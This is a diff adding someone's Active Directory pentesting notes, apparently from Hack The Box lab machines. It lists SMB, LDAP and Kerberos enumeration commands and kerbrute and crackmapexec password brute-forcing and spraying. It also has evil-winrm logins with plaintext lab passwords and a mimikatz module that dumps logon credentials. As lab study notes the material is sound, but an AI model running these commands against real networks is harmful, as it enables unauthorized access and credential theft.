@@ -1,0 +1,105 @@
+
+https://www.slideshare.net/rootedcon/carlos-garca-pentesting-active-directory
+
+============================================================================
+samba service
+
+smbclient -L 10.10.10.169
+smbclient -L \\\\10.10.10.193  -U marko%Welcome123!
+
+
+
+
+see if any file is there for public with no password
+
+=====================================================================================
+ SMB protocol null session, which may lead to the exposure of sensitive information by allowing unauthenticated sessions.
+
+From smb-security-mode and smb-os-discovery in nmap, you can see that smb signing is enabled. I use the enum4linux enumeration tool to collect information from the SMB server to automatically maximize information.
+
+use enum4linux 4 ip-address
+=================================================================================
+
+ldap scan 
+
+nmap -p 389 --script ldap-search 10.10.10.169
+
+
+#blog ldap active directory
+https://www.ibm.com/support/knowledgecenter/SS4EKN_7.2.0/com.ibm.itm.doc_6.3/adminuse/msad_ldap_vertools.htm
+==================================================================================
+
+use krb5-enum-users to enumerate users under the Kerberos domain. It needs valid Kerberos REALM to run.
+
+nmap -p 88 --script krb5-enum-users --script-args krb5-enum-users.realm='FABRICORP.LOCAL',userdb=user.txt ip-address
+
+
+/Videos/tool/kerbrute_linux_amd64 -h
+
+~/Videos/tool/kerbrute_linux_amd64 bruteforce --dc 10.10.10.193 -d fabricorp.local -users ./user.txt -passwords /usr/share/wordlists/rockyou.txt -outputfile kerb.txt
+
+
+kerbrute bruteuser -d fabricorp.local /usr/share/wordlists/rockyou.txt sthompson
+====================================================================================
+
+If the UDP ports of 389 and 636 are also exposed on the public network, they can be used to perform rootDSE queries to generate amplified DDoS attacks
+
+nmap -vv -p389 --script ldap-rootdse 10.10.10.193
+
+====================================================================================
+
+rpcclient
+
+remote login
+
+rpcclient -U "tlavel" 10.10.10.193
+
+try enter or if know then login
+=====================================================================================
+
+rpcclient query:-------------------
+
+querydominfo
+
+enumdomusers
+
+queryuser username
+
+====================================================================================
+
+win-rm service windows
+
+use evil-winrm tool for this 
+evil-winrm -u melanie -p Welcome123! -i 10.10.10.169
+evil-winrm -u svc-print -p $fab@s3Rv1ce$1 -i 10.10.10.193
+evil-winrm -u svc-print -p '$fab@s3Rv1ce$1' -i 10.10.10.193
+
+=====================================================================================
+
+ldapdomaindump -u MEGABANK\melanie 10.10.10.169
+
+info
+
+==========================================================================================================
+
+for windows box maximum chances are there that password on webpage.
+so use cewl
+cewl -m 3 -d 4 -w pass.txt --with-numbers http://fuse.fabricorp.local/papercut/logs/html/index.htm
+
+====================================================================================
+
+crackmapexec smb 10.10.10.193 -u user.txt -p /usr/share/wordlists/SecLists/Passwords/Common-Credentials/10k-most-common.txt
+
+
+crackmapexec smb 10.10.10.193 -u 'tlavel' -p 'Fabricorp01' -M mimikatz -o COMMAND='sekurlsa::logonPasswords'
+
+crackmapexec smb 10.10.10.193 -u 'tlavel' -p 'Fabricorp03' -M mimikatz -o COMMAND='sekurlsa::logonPasswords'
+
+crackmapexec smb 10.10.10.193 -u rpc-user.txt -p 'fab@s3Rv1ce$1'
+===============================================================================================
+
+smbpasswd :- we can change smbpasswd.
+when password must change flag set.
+====================================================================================================
+
+
